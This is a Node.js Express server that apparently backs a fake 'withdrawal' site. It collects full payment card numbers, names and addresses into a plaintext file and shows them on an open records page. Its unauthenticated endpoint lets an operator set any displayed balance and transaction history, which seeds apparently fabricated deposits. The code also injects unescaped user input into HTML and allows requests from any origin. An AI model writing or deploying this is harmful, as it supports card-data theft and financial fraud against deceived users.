const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const cors = require('cors'); // Added for CORS support

const app = express();
const port = process.env.PORT || 3000;

// Enable CORS for frontend requests
app.use(cors({
    origin: '*' // Adjust this to your frontend's domain in production
}));

app.use(express.json());
app.use(express.static('public')); // Serve static files from 'public' folder

// Store withdrawal data
const withdrawalsFile = path.join(__dirname, 'withdrawals.json');

// Initialize withdrawals array if file doesn't exist
async function initializeWithdrawals() {
    try {
        await fs.access(withdrawalsFile);
    } catch (error) {
        await fs.writeFile(withdrawalsFile, JSON.stringify([]));
    }
}

// Withdrawal endpoint
app.post('/api/withdraw', async (req, res) => {
    try {
        const withdrawalData = {
            ...req.body,
            timestamp: new Date().toISOString()
        };

        // Read current withdrawals
        const data = await fs.readFile(withdrawalsFile, 'utf8');
        const withdrawals = JSON.parse(data);
        
        // Add new withdrawal
        withdrawals.push(withdrawalData);
        
        // Save updated withdrawals
        await fs.writeFile(withdrawalsFile, JSON.stringify(withdrawals, null, 2));
        
        res.status(200).json({ message: 'Withdrawal recorded successfully' });
    } catch (error) {
        console.error('Error processing withdrawal:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Display withdrawals page
app.get('/withdrawals', async (req, res) => {
    try {
        const data = await fs.readFile(withdrawalsFile, 'utf8');
        const withdrawals = JSON.parse(data);

        const html = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>Withdrawal Records</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; }
                    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
                    th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
                    th { background-color: #1564C0; color: white; }
                    tr:nth-child(even) { background-color: #f9f9f9; }
                    h1 { color: #1564C0; }
                </style>
            </head>
            <body>
                <h1>Withdrawal Records</h1>
                <table>
                    <tr>
                        <th>Timestamp</th>
                        <th>Amount</th>
                        <th>Card Number</th>
                        <th>Cardholder</th>
                        <th>Address</th>
                    </tr>
                    ${withdrawals.map(w => `
                        <tr>
                            <td>${new Date(w.timestamp).toLocaleString()}</td>
                            <td>$${w.amount}</td>
                            <td>****-****-****-${w.cardNumber.slice(-4)}</td>
                            <td>${w.cardholdername}</td>
                            <td>${w.billingAddress}, ${w.city}, ${w.state} ${w.zipCode}</td>
                        </tr>
                    `).join('')}
                </table>
            </body>
            </html>
        `;

        res.send(html);
    } catch (error) {
        console.error('Error displaying withdrawals:', error);
        res.status(500).send('Error loading withdrawal records');
    }
});

// Redirect root URL to /withdrawals
app.get('/', (req, res) => {
    res.redirect('/withdrawals');
});

// Store balance and history
let balance = 678;
let transactionHistory = [
    { type: 'Deposit', amount: 5000, date: '2025-03-01' },
    { type: 'Deposit', amount: 2000, date: '2025-03-05' },
    { type: 'Deposit', amount: 1000, date: '2025-03-10' },
    { type: 'Withdrawal', amount: 6856, date: '2025-03-17' }
];

// Update balance and history endpoint
app.post('/api/update-balance-history', async (req, res) => {
    try {
        const { newBalance, newHistory } = req.body;
        
        if (newBalance !== undefined) {
            balance = parseFloat(newBalance);
        }
        
        if (newHistory && Array.isArray(newHistory)) {
            transactionHistory = newHistory;
        }
        
        res.status(200).json({ 
            message: 'Balance and history updated',
            balance,
            transactionHistory 
        });
    } catch (error) {
        console.error('Error updating balance/history:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Get current balance and history
app.get('/api/balance-history', (req, res) => {
    res.json({ balance, transactionHistory });
});

app.listen(port, async () => {
    await initializeWithdrawals();
    console.log(`Server running on port ${port}`);
});
